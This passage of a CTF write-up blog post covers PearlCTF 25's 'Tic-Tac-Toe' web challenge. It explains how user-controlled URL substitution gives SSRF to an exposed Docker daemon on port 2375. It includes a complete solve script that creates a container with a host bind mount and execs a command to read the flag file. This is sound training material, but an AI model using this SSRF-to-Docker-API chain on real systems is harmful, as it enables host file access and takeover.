container by the name <code>game</code> is existant or not. Then, it runs a container based off of <code>b3gul4/tic-tac-toe</code> image.</li></ol><blockquote><p>It should be noted that docker-cli was installed in the Dockerfile, that&rsquo;s why we can run commands inside the container.</p></blockquote><ol start=2><li>root (/): This one is interesting. Unlike the deploy endpoint which we can&rsquo;t control. It seems
like the / endpoint accepts a POST request which ultimately (after url checking) visits a url
that is supplied by us.</li></ol><p>Now we start to get an idea of how the application works. We can MAYBE make requests, but first we have
to overcome the line of defense put by the application. Let&rsquo;s check <code>url.py</code></p><h3 id=urlpy><code>url.py</code><a hidden class=anchor aria-hidden=true href=#urlpy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://&lt;domain&gt;:&lt;port&gt;/&lt;game_action&gt;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_valid_state</span><span class=p>(</span><span class=n>state</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>state</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>9</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>state</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>s</span> <span class=ow>not</span> <span class=ow>in</span> <span class=p>[</span><span class=s2>&#34;X&#34;</span><span class=p>,</span> <span class=s2>&#34;O&#34;</span><span class=p>,</span> <span class=s2>&#34;_&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_game_url</span><span class=p>(</span><span class=n>req_json</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>api</span> <span class=o>=</span> <span class=n>req_json</span><span class=p>[</span><span class=s2>&#34;api&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>keys</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>api</span><span class=o>.</span><span class=n>keys</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>URL</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&lt;domain&gt;&#34;</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;GAME_API_DOMAIN&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&lt;port&gt;&#34;</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;GAME_API_PORT&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=c1># The game api is going to have many more endpoints in future, I do not want to hardcode the action</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>url</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>keys</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>api</span><span class=p>[</span><span class=n>keys</span><span class=p>[</span><span class=mi>0</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>is_valid_state</span><span class=p>(</span><span class=n>req_json</span><span class=p>[</span><span class=s2>&#34;state&#34;</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;Invalid state&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=n>url</span><span class=p>,</span> <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=n>req_json</span><span class=p>[</span><span class=s2>&#34;action&#34;</span><span class=p>],</span> <span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;Internal server error&#34;</span><span class=p>}</span>
</span></span></code></pre></div><p>The function <code>get_game_url</code> (the one in app.py) attempts to sanitize our user input. It does so as follows:</p><ol><li>takes input like this:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=err>&#39;api&#39;:</span> <span class=err>X,</span>
</span></span><span class=line><span class=cl>    <span class=err>&#39;state&#39;:</span> <span class=err>Y,</span>
</span></span><span class=line><span class=cl>    <span class=err>&#39;action&#39;:</span> <span class=err>Z</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ol start=2><li>extracts a list of keys from the api. This suggests that X is actually an object of key-value pairs. like this:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;api&#34;</span><span class=p>:</span> <span class=p>{</span>  <span class=nt>&#34;key1&#34;</span><span class=p>:</span> <span class=s2>&#34;value1&#34;</span><span class=p>,</span> <span class=nt>&#34;key2&#34;</span><span class=p>:</span> <span class=s2>&#34;value2&#34;</span><span class=err>...etc</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;state&#34;</span><span class=p>:</span> <span class=err>Y</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=err>Z</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ol start=3><li><p>After that, it crafts a <code>url</code> from <code>http://&lt;domain>:&lt;port>/&lt;game_action></code> by doing a series of substitutions as follows:</p><p>3.1. replace <code>&lt;domain></code> and <code>&lt;port></code> with predefined values (not very useful to us)</p><p>3.2. replace <code>key1</code> with <code>value1</code> from our input json!!!</p></li></ol><p>Now THIS, is very interesting. We can tamper with the URL however we want. Say:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>url</span> <span class=o>=</span> http://localhost:8000/&lt;game_action&gt;
</span></span></code></pre></div><p>and</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>key1</span> <span class=o>=</span> localhost:8000/&lt;game_action&gt; and <span class=nv>value1</span> <span class=o>=</span> example.com
</span></span></code></pre></div><p>The generated url is <code>http://example.com</code>. Completely controllable by us!</p><p>Is this enough though? Well, not quite so, we need to ensure that &lsquo;state&rsquo; verifies the condition put as well.
That&rsquo;s easy, just set it to 9 Os or 9 Xs</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;api&#34;</span><span class=p>:</span> <span class=p>{</span>  <span class=nt>&#34;key1&#34;</span><span class=p>:</span> <span class=s2>&#34;value1&#34;</span><span class=p>,</span> <span class=nt>&#34;key2&#34;</span><span class=p>:</span> <span class=s2>&#34;value2&#34;</span><span class=err>...etc</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;state&#34;</span><span class=p>:</span> <span class=s2>&#34;XXXXXXXXX&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;get&#34;</span> <span class=c1>//or post if we want to trigger the post section of the request handler
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></div><p>This way, we can make requests yes, but how can we retrieve the flag?</p><p>Here comes the <code>DOCKER_HOST</code> environment variable.</p><hr><p>Docker is an containerization technology, ie not quite like VM, but behaves in a way
that makes the processes running inside the container isolated from the host machine.</p><p>The process responsible for managing all of this is the <a href=https://docs.docker.com/reference/cli/dockerd/#daemon-socket-option><strong>docker daemon</strong></a>, better known as <code>dockerd</code>.
It&rsquo;s a persistent background process that acts as a <a href=https://stackoverflow.com/questions/3900549/what-is-runtime>runtime</a> that manages docker objects, ie images, containers&mldr;etc.</p><p>Docker dameon listens for REST API requests, which are HTTP requests, and as we know, HTTP
is built on top of TCP, and where does the latter word appear in our application? That&rsquo;s right! in the Dockerfile:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl><span class=k>ENV</span> <span class=nv>DOCKER_HOST</span><span class=o>=</span><span class=s2>&#34;tcp://localhost:2375&#34;</span><span class=err>
</span></span></span></code></pre></div><p>How is this information useful you ask? Well, let&rsquo;s say that exposing your docker daemon brings deamons.
The kind that lets us interact with the host machine and create, start, stop, execute any docker command we like.</p><h2 id=2-task-analysis>2. Task Analysis<a hidden class=anchor aria-hidden=true href=#2-task-analysis>#</a></h2><p>The challenge overview was long I know, but now we know what we have to do. Since we think that dockerd
is exposed through the network, we first should make an HTTP request to <code>http://localhost:2375/info</code> to verify our assumption.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:80&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># url = &#39;https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;api&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;8000/&lt;game_action&gt;&#34;</span><span class=p>:</span> <span class=s2>&#34;2375/info&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;state&#39;</span><span class=p>:</span> <span class=s2>&#34;_________&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;get&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>info</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>info</span><span class=p>)</span>
</span></span></code></pre></div><blockquote><p>I&rsquo;ll leave the burden of understand my script to you. You have all the pieces you need.</p></blockquote><p><img alt=system-info loading=lazy src=/blog/images/2025-03-09-22-53-14.png></p><p>Nice! We confirmed our assumption. We can move to the next step, which is retrieving the flag.</p><hr><p>To get the flag, the simplest we can do is create a container using the already existing image.
Mout the host filesystem into this newly created container, and just cat-ing out the flag.txt file.</p><h2 id=3-solution>3. Solution<a hidden class=anchor aria-hidden=true href=#3-solution>#</a></h2><p>All the steps mentioned above are below on this script:</p><h3 id=solvepy><code>solve.py</code><a hidden class=anchor aria-hidden=true href=#solvepy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://localhost:80&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># url = &#39;https://tic-tac-toe-c8ae075ea3c02b7e.ctf.pearlctf.in&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># step 0: create a new container that the flag.txt is mounted on</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;state&#39;</span><span class=p>:</span> <span class=s2>&#34;_________&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;api&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;8000/&lt;game_action&gt;&#34;</span><span class=p>:</span> <span class=s2>&#34;2375/containers/create&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;post&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Image&#34;</span><span class=p>:</span> <span class=s2>&#34;b3gul4/tic-tac-toe&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;HostConfig&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Binds&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;/flag:/flag:ro&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>container_info</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>container_id</span> <span class=o>=</span> <span class=n>container_info</span><span class=p>[</span><span class=s1>&#39;body&#39;</span><span class=p>][</span><span class=s1>&#39;Id&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>container_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># step 1.0: start the container</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;state&#39;</span><span class=p>:</span> <span class=s2>&#34;_________&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;api&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;8000/&lt;game_action&gt;&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;2375/containers/</span><span class=si>{</span><span class=n>container_id</span><span class=si>}</span><span class=s2>/restart&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;post&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>start_data</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>start_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># exit()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># # step 1.1: check if it&#39;s up (optional)</span>
</span></span><span class=line><span class=cl><span class=c1># payload = {</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#39;state&#39;: &#34;_________&#34;,</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#39;api&#39;: {&#34;8000/&lt;game_action&gt;&#34;: f&#34;2375/containers/{container_id}/logs?stdout=true&amp;stderr=true&#34;},</span>
</span></span><span class=line><span class=cl><span class=c1>#     &#39;action&#39;: &#39;get&#39;,</span>
</span></span><span class=line><span class=cl><span class=c1># }</span>
</span></span><span class=line><span class=cl><span class=c1># containers = requests.post(url, json=payload).json()</span>
</span></span><span class=line><span class=cl><span class=c1># print(containers)</span>
</span></span><span class=line><span class=cl><span class=c1># exit()</span>
</span></span><span class=line><span class=cl><span class=c1># container_id = containers[&#39;body&#39;][0][&#39;Id&#39;]</span>
</span></span><span class=line><span class=cl><span class=c1># print(container_id)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;==========================================================&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># step 2: create an exec session to get the flag</span>
</span></span><span class=line><span class=cl><span class=c1># wished payload: {&#34;AttachStdout&#34;: True, &#34;AttachStderr&#34;: True, &#34;Tty&#34;: False, &#34;Cmd&#34;: [&#34;cat&#34;, &#34;/flag/flag.txt&#34;]}</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;state&#39;</span><span class=p>:</span> <span class=s2>&#34;_________&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;api&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;8000/&lt;game_action&gt;&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;2375/containers/</span><span class=si>{</span><span class=n>container_id</span><span class=si>}</span><span class=s2>/exec&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;post&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;AttachStdout&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span> <span class=s2>&#34;AttachStderr&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span> <span class=s2>&#34;Tty&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;Cmd&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=s2>&#34;/flag/flag.txt&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>exec_data</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># print(exec_data.json())</span>
</span></span><span class=line><span class=cl><span class=n>exec_id</span> <span class=o>=</span> <span class=n>exec_data</span><span class=p>[</span><span class=s1>&#39;body&#39;</span><span class=p>][</span><span class=s1>&#39;Id&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># print(exec_id)</span>
</span></span><span class=line><span class=cl><span class=c1># exit()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;==========================================================&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># step 3: start the session to actually get the flag</span>
</span></span><span class=line><span class=cl><span class=c1># wished payload: {&#34;Detach&#34;: False, &#34;Tty&#34;: False}</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;state&#39;</span><span class=p>:</span> <span class=s2>&#34;_________&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;api&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;8000/&lt;game_action&gt;&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;2375/exec/</span><span class=si>{</span><span class=n>exec_id</span><span class=si>}</span><span class=s2>/start&#34;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;post&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;Detach&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;Tty&#34;</span><span class=p>:</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># flag = extract_flag(resp)  # Assuming &#39;response&#39; holds the raw output</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>())</span>  <span class=c1># This should print the actual flag</span>
</span></span></code></pre></div><p><img alt=flag-picture loading=lazy src=/blog/images/2025-03-09-23-04-59.png></p><hr><p>And there we go~ Flag is: <code>pearl{do_y0u_r34llY_kn0w_d0ck3r_w3ll?}</code></p><p>If you&rsquo;re interested in learning more about the challenge, here are some additional reads:</p><ol><li><a href=https://medium.com/@iramjack8/container-vulnerabilities-part-2-3e3ae8c07934>Container Vulnerabilities|Part 2</a></li><li><a href=https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/>Attacker’s Tactics and Techniques in Unsecured Docker Daemons Revealed</a></li><li><a href=https://docs.docker.com/get-started/docker-overview/#the-docker-client>What is Docker?</a></li><li><a href=%5Bhttps://docs.docker.com/reference/cli/dockerd/#daemon-socket-option%5D>dockerd</a></li><li><a href=https://docs.docker.com/engine/daemon/remote-access/>Configure remote access for Docker daemon</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/pearl/>Pearl</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/utctf/number-champ/><span class=title>« Prev</span><br><span>UTCTF25 - Number Champ (WEB)</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/cyberspace24/trendz/><span class=title>Next »</span><br><span>CyberSpace24 - Trendz</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on x" href="https://x.com/intent/tweet/?text=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f&amp;hashtags=ctf%2cwrite-up%2cpearl"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f&amp;title=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe&amp;summary=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f&title=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share PearlCTF 25 - Web/Tic-Tac-Toe on whatsapp" href="https://api.whatsapp.com/send?text=PearlCTF%2025%20-%20Web%2fTic-Tac-Toe%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fpearl25%2ftic-tac-toe%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 